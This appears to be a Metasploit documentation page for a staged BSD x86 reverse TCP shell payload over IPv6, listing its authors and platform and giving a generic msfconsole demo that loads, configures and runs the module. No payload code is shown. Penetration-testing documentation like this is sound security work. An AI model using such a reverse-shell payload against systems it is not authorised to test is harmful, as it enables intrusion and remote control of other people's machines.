## BSD Command Shell, Reverse TCP Stager (IPv6)

Spawn a command shell (staged). Connect back to the attacker 
over IPv6


## Module Name
payload/bsd/x86/shell/reverse_ipv6_tcp

## Authors
* skape
* vlad902
* hdm





## Platforms
* bsd

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/bsd/x86/shell/reverse_ipv6_tcp
msf payload(reverse_ipv6_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_ipv6_tcp) > set TARGET <target-id>
msf payload(reverse_ipv6_tcp) > show options
   ... show and set options ...
msf payload(reverse_ipv6_tcp) > run
```
    
    